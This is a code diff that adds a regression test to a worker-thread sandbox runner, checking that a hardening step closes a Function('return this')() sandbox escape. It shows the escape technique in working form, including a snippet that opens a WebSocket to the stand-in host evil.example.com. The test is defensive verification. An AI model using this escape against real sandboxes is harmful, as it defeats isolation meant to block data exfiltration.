@@ -28,6 +28,7 @@ import {
 } from './worker-entry';
 import type { ResultMessage, RunMessage } from './worker-protocol';
 
+import { fileURLToPath } from 'node:url';
 import { Worker as ThreadWorkerImpl } from 'node:worker_threads';
 
 /* -------------------------------------------------------------------------- */
@@ -253,6 +254,119 @@ class ThreadWorker implements WorkerLike {
         void this.w.terminate();
     }
 }
+
+/* -------------------------------------------------------------------------- */
+/*  (A′) Function-constructor egress-escape worker (SEC-01/04/30/34)           */
+/* -------------------------------------------------------------------------- */
+
+/**
+ * A worker-thread body that reproduces the production worker BOOTSTRAP so we can
+ * mechanically prove the `Function('return this')()` sandbox-escape is closed.
+ *
+ * It (1) SEEDS live egress capabilities (`WebSocket`, `XMLHttpRequest`,
+ * `EventSource`, `importScripts`, `navigator.sendBeacon`) onto the thread's REAL
+ * `globalThis` — so before hardening the escape reaches live functions, exactly
+ * as it does in an un-hardened Worker; (2) OPTIONALLY calls the SHIPPED
+ * `hardenWorkerGlobal()` from `harden-worker-global.ts` (the Finding-1 fix),
+ * gated on `msg.harden`; (3) runs the snippet under the SAME allow-listed scope
+ * + AsyncFunction wrapper as worker-entry.ts, where the dangerous globals are
+ * bound `undefined` as PARAMETERS only (the shadowing the escape defeats).
+ *
+ * The snippet reaches the real global via `Function('return this')()` and the
+ * result reports what each capability resolved to. With `harden:true` every one
+ * must be `'undefined'`; with `harden:false` they are live — proving the test
+ * would fail if the bootstrap hardening were absent (the vuln is real, the fix
+ * is what closes it). Runs the thread under tsx (`--import tsx`) so it can import
+ * the real `.ts` hardening module rather than a copy (no logic drift).
+ */
+const ESCAPE_THREAD_BODY = `
+const { parentPort } = require('node:worker_threads');
+const { pathToFileURL } = require('node:url');
+parentPort.on('message', async (msg) => {
+  try {
+    // Seed live egress capabilities on the REAL worker global (an un-hardened
+    // Worker exposes these; a bare Node worker doesn't have them all, so we seed
+    // them to make the "before" state faithful for every capability).
+    const g = Function('return this')();
+    g.WebSocket = function FakeWebSocket(){ this.real = true; };
+    g.XMLHttpRequest = function FakeXHR(){ this.real = true; };
+    g.EventSource = function FakeEventSource(){ this.real = true; };
+    g.importScripts = function importScripts(){ return 'loaded-remote-code'; };
+    g.Worker = function FakeWorker(){ this.real = true; };
+    if (!g.navigator || typeof g.navigator !== 'object') g.navigator = {};
+    try { g.navigator.sendBeacon = function sendBeacon(){ return true; }; } catch {}
+
+    if (msg.harden) {
+      const url = pathToFileURL(msg.hardenModulePath).href;
+      const mod = await import(url);
+      mod.hardenWorkerGlobal();
+    }
+
+    // Production-shaped allow-listed scope: the dangerous names are bound
+    // undefined as PARAMETERS (worker-entry.ts). The escape below bypasses this.
+    const logs = [];
+    const scope = {
+      console: { log: (...a) => logs.push(a), info(){}, warn(){}, error(){}, debug(){} },
+      fetch: async () => ({ status: 200 }),
+      process: { env: {}, platform: 'browser', versions: {} },
+      crypto: { randomUUID: () => 'uuid-0000' },
+      window: undefined, self: undefined, globalThis: undefined, document: undefined,
+      importScripts: undefined, XMLHttpRequest: undefined, WebSocket: undefined,
+      EventSource: undefined, require: undefined,
+    };
+    const names = Object.keys(scope);
+    const values = names.map((n) => scope[n]);
+    const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
+    const fn = new AsyncFunction(...names, '"use strict";\\nreturn (async () => {\\n' + msg.js + '\\n})();');
+    const value = await fn(...values);
+    parentPort.postMessage({ type: 'result', logs, notices: [], value: clone(value) });
+  } catch (err) {
+    parentPort.postMessage({ type: 'result', logs: [], notices: [], error: { name: err && err.name || 'Error', message: err && err.message || String(err), stack: err && err.stack } });
+  }
+});
+function clone(v) { try { return JSON.parse(JSON.stringify(v)); } catch { return undefined; } }
+`;
+
+/**
+ * `WorkerLike` over {@link ESCAPE_THREAD_BODY}. `harden` selects whether the
+ * thread calls the shipped `hardenWorkerGlobal()` at bootstrap; `hardenModulePath`
+ * is the absolute path to the real `.ts` module the thread imports under tsx.
+ */
+class EscapeThreadWorker implements WorkerLike {
+    onmessage: ((ev: { data: unknown }) => void) | null = null;
+    onerror: ((err: unknown) => void) | null = null;
+    private readonly w: ThreadWorkerImpl;
+    constructor(
+        private readonly harden: boolean,
+        private readonly hardenModulePath: string,
+    ) {
+        this.w = new ThreadWorkerImpl(ESCAPE_THREAD_BODY, {
+            eval: true,
+            // Run the thread under tsx so `import('<…>.ts')` resolves the real
+            // hardening module (esbuild bundles it in production; tsx compiles it
+            // here) — the test asserts the SHIPPED code, not a re-implementation.
+            execArgv: ['--import', 'tsx'],
+        });
+        this.w.on('message', (data) => this.onmessage?.({ data }));
+        this.w.on('error', (err) => this.onerror?.(err));
+    }
+    postMessage(message: unknown): void {
+        // Fold the harden knob + module path into the run message the body reads.
+        this.w.postMessage({
+            ...(message as object),
+            harden: this.harden,
+            hardenModulePath: this.hardenModulePath,
+        });
+    }
+    terminate(): void {
+        void this.w.terminate();
+    }
+}
+
+/** Absolute path to the shipped hardening module (imported inside the thread). */
+const HARDEN_MODULE_PATH = fileURLToPath(
+    new URL('./harden-worker-global.ts', import.meta.url),
+);
 
 /* -------------------------------------------------------------------------- */
 /*  Tests                                                                      */
@@ -729,6 +843,98 @@ async function runTests(): Promise<void> {
             'SEC-36/37 no globalThis bleed across runs',
             r2.value === 'clean',
             r2.value,
+        );
+    }
+
+    // SEC-01/04/30/34 — Function-constructor egress escape is CLOSED at bootstrap.
+    // A snippet reaches the worker's REAL global via `Function('return this')()`
+    // (bypassing worker-entry's parameter shadowing). After the shipped
+    // `hardenWorkerGlobal()` runs, every real-egress capability it could grab is
+    // inert `undefined`; without it they are live (proven by the control run
+    // below). This is the regression for Finding 1.
+    {
+        // The escape snippet: grab the real global by the Function-constructor
+        // route and report what each dangerous capability resolves to. It also
+        // proves `WebSocket` is not merely shadowed but genuinely unconstructable.
+        const escapeCode = `
+            const g = Function('return this')();
+            let constructed = false;
+            try { new g.WebSocket('wss://evil.example.com'); constructed = true; } catch {}
+            return {
+              ws: typeof g.WebSocket,
+              xhr: typeof g.XMLHttpRequest,
+              es: typeof g.EventSource,
+              imp: typeof g.importScripts,
+              worker: typeof g.Worker,
+              beacon: typeof (g.navigator && g.navigator.sendBeacon),
+              constructedWebSocket: constructed,
+            };`;
+
+        // (i) HARDENED — the production path. Every capability must be gone.
+        const hardenedRunner = makeBrowserWorkerRunner({
+            transpileFn: passthroughTranspile,
+            workerFactory: () =>
+                new EscapeThreadWorker(true, HARDEN_MODULE_PATH),
+            defaultTimeoutMs: 5000,
+        });
+        const hardened = await hardenedRunner.run({ code: escapeCode });
+        const hv = hardened.value as Record<string, unknown> | undefined;
+        assert(
+            'SEC-04 Function-escape run resolved (no error)',
+            hardened.error === undefined && !!hv,
+            hardened.error ?? hardened.value,
+        );
+        assert(
+            "SEC-04 escaped globalThis.WebSocket is 'undefined' after harden",
+            hv?.ws === 'undefined',
+            hv,
+        );
+        assert(
+            "SEC-04 escaped globalThis.XMLHttpRequest is 'undefined' after harden",
+            hv?.xhr === 'undefined',
+            hv,
+        );
+        assert(
+            "SEC-04 escaped globalThis.EventSource is 'undefined' after harden",
+            hv?.es === 'undefined',
+            hv,
+        );
+        assert(
+            "SEC-31 escaped globalThis.importScripts is 'undefined' after harden",
+            hv?.imp === 'undefined',
+            hv,
+        );
+        assert(
+            "SEC-04 escaped globalThis.Worker is 'undefined' after harden",
+            hv?.worker === 'undefined',
+            hv,
+        );
+        assert(
+            "SEC-04 escaped navigator.sendBeacon is 'undefined' after harden",
+            hv?.beacon === 'undefined',
+            hv,
+        );
+        assert(
+            'SEC-04 new (escaped WebSocket) did NOT construct after harden',
+            hv?.constructedWebSocket === false,
+            hv,
+        );
+
+        // (ii) CONTROL — same body WITHOUT the bootstrap harden. This documents
+        // the vuln: the escape DOES reach a live WebSocket. It proves the assertions
+        // above are meaningful (they would fail if hardening were removed).
+        const unhardenedRunner = makeBrowserWorkerRunner({
+            transpileFn: passthroughTranspile,
+            workerFactory: () =>
+                new EscapeThreadWorker(false, HARDEN_MODULE_PATH),
+            defaultTimeoutMs: 5000,
+        });
+        const control = await unhardenedRunner.run({ code: escapeCode });
+        const cv = control.value as Record<string, unknown> | undefined;
+        assert(
+            'SEC-04 CONTROL (no harden): escape reaches a LIVE WebSocket',
+            cv?.ws === 'function' && cv?.constructedWebSocket === true,
+            cv,
         );
     }
 
